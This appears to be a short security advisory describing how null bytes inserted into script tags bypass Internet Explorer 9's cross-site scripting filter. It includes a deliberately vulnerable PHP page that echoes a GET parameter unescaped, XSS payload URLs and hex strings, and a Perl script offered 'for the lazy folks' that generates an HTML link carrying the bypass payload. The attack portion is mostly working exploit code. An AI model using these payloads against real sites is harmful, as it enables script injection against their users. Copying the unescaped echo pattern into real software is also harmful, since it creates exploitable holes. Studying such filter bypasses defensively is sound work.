Issue: Cross Site Scripting Filter Bypass

-------------------------------------

Description:

The Internet Explorer 9 offers a feature to eliminate suspicious pattern passed to the website by a

parameter.

For example, we have the following script:

-------------------------------------

<?php

echo $_GET['a'];

?>

-------------------------------------

Let's call it "blah.php". Now we access the blah.php by using Internet Explorer 9 and try to execute a

malicious string:

http://localhost/ieb/blah.php?a=<script>alert(1)</script>

After this, we receive the message "Internet Explorer has modified this page to help prevent cross-

site scripting".

The JavaScript won't be executed.

-------------------------------------

Proof Of Concept:

This trick may be known to some of you. Internet Explorer allows stripping tags by inserting

nullbytes.

For example, the following string will be executed:

3C 73 00 63 72 69 70 74 3E 61 6C 65 72 74 28 31 29 3C 2F 73 00 63 72 69 70 74 3E

Which is actually "<s[NULL]cript>alert(1)</s[NULL]cript>".

However, we won't be able to insert the nullbytes directly in the URI. The following example won't

work:

http://localhost/ieb/blah.php?a=<s%00cript>alert(1)</s%00cript>

But there is still another possibility. Grab a hex editor and create a file looking like the example

given below:

<a href='http://localhost/ieb/blah.php?a=<s[NULL]cript>alert(1)</s[NULL]cript>'>Clickme</a>

If you open the file and click the provided link, the script will be executed.

Exploit (for the lazy folks):

-------------------------------------

#!/usr/bin/perl

use strict;

my $target  = shift || die("No target defined");
my $payload = shift || die("No payload defined");
my $lnk_txt = shift || "Click me :)";

open(OUT, ">:raw", "out.html");

print OUT "\x3C\x61\x20\x68\x72\x65\x66\x3D\x27";

print OUT $target;

print OUT "\x3C\x73\x00\x63\x72\x69\x70\x74\x3E";

print OUT $payload;

print OUT "\x3C\x2F\x73\x00\x63\x72\x69\x70\x74\x3E\x27\x3E";

print OUT $lnk_txt;

print OUT "\x3C\x2F\x61\x3E";

close(OUT);

-------------------------------------

Example usage is:

iefilter.pl http://www.example.com?var= alert(1)

-------------------------------------

Note:

Exploitation via <a href="ja[NULL]vascript:... links is also possible.

-------------------------------------

Solution:

Currently, no solution is available for this issue.
